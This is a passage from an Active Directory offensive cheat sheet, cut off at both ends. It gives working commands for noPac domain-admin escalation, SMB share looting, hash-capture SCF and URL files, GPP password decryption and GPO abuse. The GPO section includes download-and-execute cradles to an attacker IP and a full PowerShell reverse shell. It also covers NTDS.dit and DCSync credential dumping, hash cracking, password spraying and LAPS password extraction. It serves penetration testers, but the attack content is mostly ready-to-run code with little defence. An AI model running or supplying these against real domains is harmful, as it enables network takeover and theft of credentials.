KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local' Automated exploitation:\nnoPac - @cube0x0 noPac.exe scan -domain htb.local -user user -pass \u0026#39;password123\u0026#39; noPac.exe -domain htb.local -user domain_user -pass \u0026#39;Password123!\u0026#39; /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt noPac.exe -domain htb.local -user domain_user -pass \u0026#34;Password123!\u0026#34; /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator sam_the_admin - @WazeHell $ python3 sam_the_admin.py \u0026#34;caltech/alice.cassie:Lee@tPass\u0026#34; -dc-ip 192.168.1.110 -shell [*] Selected Target dc.caltech.white [*] Total Domain Admins 11 [*] will try to impersonat gaylene.dreddy [*] Current ms-DS-MachineAccountQuota = 10 [*] Adding Computer Account \u0026#34;SAMTHEADMIN-11$\u0026#34; [*] MachineAccount \u0026#34;SAMTHEADMIN-11$\u0026#34; password = EhFMT%mzmACL [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL. [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white [*] SAMTHEADMIN-11$ sAMAccountName == dc [*] Saving ticket in dc.ccache [*] Resting the machine account to SAMTHEADMIN-11$ [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating gaylene.dreddy [*] Requesting S4U2self [*] Saving ticket in gaylene.dreddy.ccache [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system Pachine - @ly4k usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local] [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip] [domain/]username[:password] $ python3 pachine.py -dc-host dc.predator.local -scan \u0026#39;predator.local/john:Passw0rd!\u0026#39; $ python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator \u0026#39;predator.local/john:Passw0rd!\u0026#39; $ export KRB5CCNAME=$PWD/administrator@predator.local.ccache $ impacket-psexec -k -no-pass \u0026#39;predator.local/administrator@dc.predator.local\u0026#39; Mitigations:\nKB5007247 - Windows Server 2012 R2 KB5008601 - Windows Server 2016 KB5008602 - Windows Server 2019 KB5007205 - Windows Server 2022 KB5008102 KB5008380 Open Shares # Some shares can be accessible without authentication, explore them to find some juicy files\nsmbmap\nsmbmap -H 10.10.10.10 # null session smbmap -H 10.10.10.10 -R # recursive listing smbmap -H 10.10.10.10 -u invaliduser # guest smb session smbmap -H 10.10.10.10 -d \u0026#34;DOMAIN.LOCAL\u0026#34; -u \u0026#34;USERNAME\u0026#34; -p \u0026#34;Password123*\u0026#34; pth-smbclient from path-toolkit\npth-smbclient -U \u0026#34;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\u0026#34; //192.168.10.100/Share pth-smbclient -U \u0026#34;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\u0026#34; //192.168.10.100/C$ ls # list files cd # move inside a folder get # download files put # replace a file smbclient from Impacket\nsmbclient -I 10.10.10.100 -L ACTIVE -N -U \u0026#34;\u0026#34; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk use Sharename # select a Sharename cd Folder # move inside a folder ls # list files smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers\nsmbclient -U username //10.0.0.1/SYSVOL smbclient //10.0.0.1/Share # Download a folder recursively smb: \\\u0026gt; mask \u0026#34;\u0026#34; smb: \\\u0026gt; recurse ON smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; lcd \u0026#39;/path/to/go/\u0026#39; smb: \\\u0026gt; mget * SCF and URL file attack against writeable share # Theses attacks can be automated with Farmer.exe and Crop.exe\n# Farmer to receive auth farmer.exe \u0026lt;port\u0026gt; [seconds] [output] farmer.exe 8888 0 c:\\windows\\temp\\test.tmp # undefinitely farmer.exe 8888 60 # one minute # Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks crop.exe \u0026lt;output folder\u0026gt; \u0026lt;output filename\u0026gt; \u0026lt;WebDAV server\u0026gt; \u0026lt;LNK value\u0026gt; [options] Crop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico Crop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec SCF Files # Drop the following @something.scf file inside a share and start listening with Responder : responder -wrf --lm -v -I eth0\n[Shell] Command=2 IconFile=\\\\10.10.10.10\\Share\\test.ico [Taskbar] Command=ToggleDesktop Using crackmapexec:\ncrackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP URL Files # This attack also works with .url files and responder -I eth0 -v.\n[InternetShortcut] URL=whatever WorkingDirectory=whatever IconFile=\\\\10.10.10.10\\%USERNAME%.icon IconIndex=1 Windows Library Files # Windows Library Files (.library-ms)\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;libraryDescription xmlns=\u0026#34;\u0026lt;http://schemas.microsoft.com/windows/2009/library\u0026gt;\u0026#34;\u0026gt; \u0026lt;name\u0026gt;@windows.storage.dll,-34582\u0026lt;/name\u0026gt; \u0026lt;version\u0026gt;6\u0026lt;/version\u0026gt; \u0026lt;isLibraryPinned\u0026gt;true\u0026lt;/isLibraryPinned\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1003\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;searchConnectorDescriptionList\u0026gt; \u0026lt;searchConnectorDescription\u0026gt; \u0026lt;isDefaultSaveLocation\u0026gt;true\u0026lt;/isDefaultSaveLocation\u0026gt; \u0026lt;isSupported\u0026gt;false\u0026lt;/isSupported\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;url\u0026gt;\\\\\\\\workstation@8888\\\\folder\u0026lt;/url\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; \u0026lt;/searchConnectorDescriptionList\u0026gt; \u0026lt;/libraryDescription\u0026gt; Windows Search Connectors Files # Windows Search Connectors (.searchConnector-ms)\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;searchConnectorDescription xmlns=\u0026#34;\u0026lt;http://schemas.microsoft.com/windows/2009/searchConnector\u0026gt;\u0026#34;\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1002\u0026lt;/iconReference\u0026gt; \u0026lt;description\u0026gt;Microsoft Outlook\u0026lt;/description\u0026gt; \u0026lt;isSearchOnlyItem\u0026gt;false\u0026lt;/isSearchOnlyItem\u0026gt; \u0026lt;includeInStartMenuScope\u0026gt;true\u0026lt;/includeInStartMenuScope\u0026gt; \u0026lt;iconReference\u0026gt;\\\\\\\\workstation@8888\\\\folder.ico\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;url\u0026gt;\\\\\\\\workstation@8888\\\\folder\u0026lt;/url\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; Passwords in SYSVOL \u0026amp; Group Policy Preferences # Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: \\\\\u0026lt;DOMAIN\u0026gt;\\SYSVOL\\\u0026lt;DOMAIN\u0026gt;\\Policies\\.\nfindstr /S /I cpassword \\\\\u0026lt;FQDN\u0026gt;\\sysvol\\\u0026lt;FQDN\u0026gt;\\policies\\*.xml Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption\necho \u0026#39;password_in_base64\u0026#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 e.g: echo \u0026#39;5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=\u0026#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 echo \u0026#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#39; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 Automate the SYSVOL and passwords research # Metasploit modules to enumerate shares and credentials\nscanner/smb/smb_enumshares post/windows/gather/enum_shares post/windows/gather/credentials/gpp CrackMapExec modules\ncme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password Get-GPPPassword\n# with a NULL session Get-GPPPassword.py -no-pass \u0026#39;DOMAIN_CONTROLLER\u0026#39; # with cleartext credentials Get-GPPPassword.py \u0026#39;DOMAIN\u0026#39;/\u0026#39;USER\u0026#39;:\u0026#39;PASSWORD\u0026#39;@\u0026#39;DOMAIN_CONTROLLER\u0026#39; # pass-the-hash Get-GPPPassword.py -hashes \u0026#39;LMhash\u0026#39;:\u0026#39;NThash\u0026#39; \u0026#39;DOMAIN\u0026#39;/\u0026#39;USER\u0026#39;:\u0026#39;PASSWORD\u0026#39;@\u0026#39;DOMAIN_CONTROLLER\u0026#39; Mitigations # Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences. Delete existing GPP xml files in SYSVOL containing passwords. Don’t put passwords in files that are accessible by all authenticated users. Exploit Group Policy Objects GPO # Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner\n:triangular_flag_on_post: GPO Priorization : Organization Unit \u0026gt; Domain \u0026gt; Site \u0026gt; Local\nGPO are stored in the DC in \\\\\u0026lt;domain.dns\u0026gt;\\SYSVOL\\\u0026lt;domain.dns\u0026gt;\\Policies\\\u0026lt;GPOName\u0026gt;\\, inside two folders User and Machine. If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at Machine\\Preferences\\ScheduledTasks.\n:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force.\nFind vulnerable GPO # Look a GPLink where you have the Write right.\nGet-DomainObjectAcl -Identity \u0026#34;SuperSecureGPO\u0026#34; -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match \u0026#34;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\u0026#34;)} Abuse GPO with SharpGPOAbuse # # Build and configure SharpGPOAbuse $ git clone https://github.com/FSecureLABS/SharpGPOAbuse $ Install-Package CommandLineParser -Version 1.9.3.15 $ ILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll # Adding User Rights .\\SharpGPOAbuse.exe --AddUserRights --UserRights \u0026#34;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\u0026#34; --UserAccount bob.smith --GPOName \u0026#34;Vulnerable GPO\u0026#34; # Adding a Local Admin .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \u0026#34;Vulnerable GPO\u0026#34; # Configuring a User or Computer Logon Script .\\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents \u0026#34;powershell.exe -nop -w hidden -c \\\u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://10.1.1.10:80/a\u0026#39;))\\\u0026#34;\u0026#34; --GPOName \u0026#34;Vulnerable GPO\u0026#34; # Configuring a Computer or User Immediate Task # /!\\ Intended to \u0026#34;run once\u0026#34; per GPO refresh, not run once per system .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \u0026#34;Update\u0026#34; --Author DOMAIN\\Admin --Command \u0026#34;cmd.exe\u0026#34; --Arguments \u0026#34;/c powershell.exe -nop -w hidden -c \\\u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://10.1.1.10:80/a\u0026#39;))\\\u0026#34;\u0026#34; --GPOName \u0026#34;Vulnerable GPO\u0026#34; .\\SharpGPOAbuse.exe --AddComputerTask --GPOName \u0026#34;VULNERABLE_GPO\u0026#34; --Author \u0026#39;LAB.LOCAL\\User\u0026#39; --TaskName \u0026#34;EvilTask\u0026#34; --Arguments \u0026#34;/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \u0026#34; --Command \u0026#34;cmd.exe\u0026#34; --Force Abuse GPO with PowerGPOAbuse # https://github.com/rootSySdk/PowerGPOAbuse PS\u0026gt; . .\\PowerGPOAbuse.ps1 # Adding a localadmin PS\u0026gt; Add-LocalAdmin -Identity \u0026#39;Bobby\u0026#39; -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; # Assign a new right PS\u0026gt; Add-UserRights -Rights \u0026#34;SeLoadDriverPrivilege\u0026#34;,\u0026#34;SeDebugPrivilege\u0026#34; -Identity \u0026#39;Bobby\u0026#39; -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; # Adding a New Computer/User script PS\u0026gt; Add-ComputerScript/Add-UserScript -ScriptName \u0026#39;EvilScript\u0026#39; -ScriptContent $(Get-Content evil.ps1) -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; # Create an immediate task PS\u0026gt; Add-GPOImmediateTask -TaskName \u0026#39;eviltask\u0026#39; -Command \u0026#39;powershell.exe /c\u0026#39; -CommandArguments \u0026#34;\u0026#39;$(Get-Content evil.ps1)\u0026#39;\u0026#34; -Author Administrator -Scope Computer/User -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; Abuse GPO with pyGPOAbuse # $ git clone https://github.com/Hackndo/pyGPOAbuse # Add john user to local administrators group (Password: H4x00r123..) ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \u0026#34;12345677-ABCD-9876-ABCD-123456789012\u0026#34; # Reverse shell example ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \u0026#34;12345677-ABCD-9876-ABCD-123456789012\u0026#34; \\ -powershell \\ -command \u0026#34;\\$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.20.0.2\u0026#39;,1234);\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2\u0026gt;\u0026amp;1 | Out-String );\\$sendback2 = \\$sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\u0026#34; \\ -taskname \u0026#34;Completely Legit Task\u0026#34; \\ -description \u0026#34;Dis is legit, pliz no delete\u0026#34; \\ -user Abuse GPO with PowerView # # Enumerate GPO Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} # New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments \u0026#39;-NoP -NonI -W Hidden -Enc AAAAAAA...\u0026#39; -Force Abuse GPO with StandIn # # Add a local administrator StandIn.exe --gpo --filter Shards --localadmin user002 # Set custom right to a user StandIn.exe --gpo --filter Shards --setuserrights user002 --grant \u0026#34;SeDebugPrivilege,SeLoadDriverPrivilege\u0026#34; # Execute a custom command StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author \u0026#34;REDHOOK\\Administrator\u0026#34; --command \u0026#34;C:\\I\\do\\the\\thing.exe\u0026#34; --args \u0026#34;with args\u0026#34; Dumping AD Domain Credentials # You will need the following files to extract the ntds :\nNTDS.dit file SYSTEM hive (C:\\Windows\\System32\\SYSTEM) Usually you can find the ntds in two locations : systemroot\\NTDS\\ntds.dit and systemroot\\System32\\ntds.dit.\nsystemroot\\NTDS\\ntds.dit stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data). systemroot\\System32\\ntds.dit is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD. However you can change the location to a custom one, you will need to query the registry to get the current location.\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \u0026#34;DSA Database file\u0026#34; Using ndtsutil # C:\\\u0026gt;ntdsutil ntdsutil: activate instance ntds ntdsutil: ifm ifm: create full c:\\pentest ifm: quit ntdsutil: quit or\nntdsutil \u0026#34;ac i ntds\u0026#34; \u0026#34;ifm\u0026#34; \u0026#34;create full c:\\temp\u0026#34; q q Using Vshadow # vssadmin create shadow /for=C : Copy Shadow_Copy_Volume_Name\\windows\\ntds\\ntds.dit c:\\ntds.dit You can also use the Nishang script, available at : https://github.com/samratashok/nishang\nImport-Module .\\Copy-VSS.ps1 Copy-VSS Copy-VSS -DestinationDir C:\\ShadowCopy\\ Using vssadmin # vssadmin create shadow /for=C: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ShadowCopy copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\ShadowCopy Using DiskShadow (a Windows signed binary) # diskshadow.txt contains : set context persistent nowriters add volume c: alias someAlias create expose %someAlias% z: exec \u0026#34;cmd.exe\u0026#34; /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit delete shadows volume %someAlias% reset then: NOTE - must be executed from C:\\Windows\\System32 diskshadow.exe /s c:\\diskshadow.txt dir c:\\exfil reg.exe save hklm\\system c:\\exfil\\system.bak Using esentutl.exe # Copy/extract a locked file such as the AD Database\nesentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit Extract hashes from ntds.dit # then you need to use secretsdump to extract the hashes, use the LOCAL options to use it on a retrieved ntds.dit\nsecretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL secretsdump also works remotely\n./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1 -pwd-last-set: Shows pwdLastSet attribute for each NTDS.DIT account. -user-status: Display whether or not the user is disabled. Alternatives - modules # Metasploit modules\nwindows/gather/credentials/domain_hashdump PowerSploit module\nInvoke-NinjaCopy --path c:\\windows\\NTDS\\ntds.dit --verbose --localdestination c:\\ntds.dit CrackMapExec module\ncme smb 10.10.0.202 -u username -p password --ntds vss cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default Using Mimikatz DCSync # Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.\n# DCSync only one user mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt # DCSync all users of the domain mimikatz# lsadump::dcsync /domain:htb.local /all /csv :warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.\nUsing Mimikatz sekurlsa # Dumps credential data in an Active Directory domain when run on a Domain Controller. :warning: Requires administrator access with debug or Local SYSTEM rights\nsekurlsa::krbtgt lsadump::lsa /inject /name:krbtgt Crack NTLM hashes with hashcat # Useful when you want to have the clear text password or when you need to make stats about weak passwords.\nRecommended wordlists:\nRockyou.txt Have I Been Pwned founds Weakpass.com Read More at Methodology and Resources/Hash Cracking.md # Basic wordlist # (-O) will Optimize for 32 characters or less passwords # (-w 4) will set the workload to \u0026#34;Insane\u0026#34; $ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2 # Generate a custom mask based on a wordlist $ git clone https://github.com/iphelix/pack/blob/master/README $ python2 statsgen.py ../hashcat.potfile -o hashcat.mask $ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask :warning: If the password is not a confidential data (challenges/ctf), you can use online \u0026ldquo;cracker\u0026rdquo; like :\nhashmob.net crackstation.net hashes.com User Hunting # Sometimes you need to find a machine where a specific user is logged in. You can remotely query every machines on the network to get a list of the users\u0026rsquo;s sessions.\nCrackMapExec cme smb 10.10.10.0/24 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; --sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG [+] Enumerated sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG \\\\10.10.10.10 User:Administrator Impacket Smbclient $ impacket-smbclient Administrator@10.10.10.10 # who host: \\\\10.10.10.10, user: Administrator, active: 1, idle: 0 PowerView Invoke-UserHunter # Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \u0026#34;RDPUsers\u0026#34; Invoke-UserHunter -Stealth Password spraying # Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.\nThe builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.\nMost of the time the best passwords to spray are :\nP@ssw0rd01, Password123, Password1, Hello123, mimikatz Welcome1/Welcome01 $Companyname1 :$Microsoft1 SeasonYear : Winter2019*, Spring2020!, Summer2018?, Summer2020, July2020! Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#) Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0) Kerberos pre-auth bruteforcing # Using kerbrute, a tool to perform Kerberos pre-auth bruteforcing.\nKerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).\nUsername bruteforce root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt Password bruteforce root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username Password spray root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt \u0026#39;123456\u0026#39; -v --delay 100 -o kerbrute-passwordspray-123456.log Spray a pre-generated passwords list # Using crackmapexec and mp64 to generate passwords and spray them against SMB services on the network. crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)` Using DomainPasswordSpray to spray a password against all users of a domain. # https://github.com/dafthack/DomainPasswordSpray Invoke-DomainPasswordSpray -Password Summer2021! # /!\\ be careful with the account lockout ! Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt Using SMBAutoBrute. Invoke-SMBAutoBrute -UserList \u0026#34;C:\\ProgramData\\admins.txt\u0026#34; -PasswordList \u0026#34;Password1, Welcome1, 1qazXDR%+\u0026#34; -LockoutThreshold 5 -ShowVerbose Spray passwords against the RDP service # Using RDPassSpray to target RDP services. git clone https://github.com/xFreed0m/RDPassSpray python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP] Using hydra and ncrack to target RDP services. hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10 BadPwdCount attribute # The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.\n$ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 --users LDAP 10.0.2.11 389 dc01 Guest badpwdcount: 0 pwdLastSet: \u0026lt;never\u0026gt; LDAP 10.0.2.11 389 dc01 krbtgt badpwdcount: 0 pwdLastSet: \u0026lt;never\u0026gt; Password in AD User comment # $ crackmapexec ldap domain.lab -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; -M user-desc $ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 -M get-desc-users GET-DESC... 10.0.2.11 389 dc01 [+] Found following users: GET-DESC... 10.0.2.11 389 dc01 User: Guest description: Built-in account for guest access to the computer/domain GET-DESC... 10.0.2.11 389 dc01 User: krbtgt description: Key Distribution Center Service Account There are 3-4 fields that seem to be common in most AD schemas: UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.\nenum4linux | grep -i desc Get-WmiObject -Class Win32_UserAccount -Filter \u0026#34;Domain=\u0026#39;COMPANYDOMAIN\u0026#39; AND Disabled=\u0026#39;False\u0026#39;\u0026#34; | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID or dump the Active Directory and grep the content.\nldapdomaindump -u \u0026#39;DOMAIN\\john\u0026#39; -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/ Password of Pre-Created Computer Account # When Assign this computer account as a pre-Windows 2000 computer checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have the password serverdemo.\n# Create a machine with default password # must be run from a domain joined device connected to the domain djoin /PROVISION /DOMAIN \u0026lt;fqdn\u0026gt; /MACHINE evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc When you attempt to login using the credential you should have the following error code : STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT. Then you need to change the password with rpcchangepwd.py Reading LAPS Password # Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure.\nDetermine if LAPS is installed # Get-ChildItem \u0026#39;c:\\program files\\LAPS\\CSE\\Admpwd.dll\u0026#39; Get-FileHash \u0026#39;c:\\program files\\LAPS\\CSE\\Admpwd.dll\u0026#39; Get-AuthenticodeSignature \u0026#39;c:\\program files\\LAPS\\CSE\\Admpwd.dll\u0026#39; Extract LAPS password # The \u0026ldquo;ms-mcs-AdmPwd\u0026rdquo; a \u0026ldquo;confidential\u0026rdquo; computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users\nFrom Windows:\nadsisearcher (native binary on Windows 8+)\n([adsisearcher]\u0026#34;(\u0026amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\u0026#34;).findAll() | ForEach-Object { $_.properties} ([adsisearcher]\u0026#34;(\u0026amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\u0026#34;).findAll() | ForEach-Object { $_.properties} PowerView\nPS \u0026gt; Import-Module .\\PowerView.ps1 PS \u0026gt; Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime LAPSToolkit\n$ Get-LAPSComputers ComputerName Password Expiration ------------ -------- ---------- example.domain.local dbZu7;vGaI)Y6w1L 02/21/2021 22:29:18 $ Find-LAPSDelegatedGroups $ Find-AdmPwdExtendedRights Powershell AdmPwd.PS\nforeach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}} From Linux:\npyLAPS to read and write LAPS passwords:\n# Read the password of all computers ./pyLAPS.py --action get -u \u0026#39;Administrator\u0026#39; -d \u0026#39;LAB.local\u0026#39; -p \u0026#39;Admin123!\u0026#39; --dc-ip 192.168.2.1 # Write a random password to a specific computer ./pyLAPS.py --action set --computer \u0026#39;PC01$\u0026#39; -u \u0026#39;Administrator\u0026#39; -d \u0026#39;LAB.local\u0026#39; -p \u0026#39;Admin123!\u0026#39; --dc-ip 192.168.2.1 CrackMapExec:\ncrackmapexec smb 10.10.10.10 -u \u0026#39;user\u0026#39; -H \u0026#39;8846f7eaee8fb117ad06bdd830b7586c\u0026#39; -M laps LAPSDumper\npython laps.py -u \u0026#39;user\u0026#39; -p \u0026#39;password\u0026#39; -d 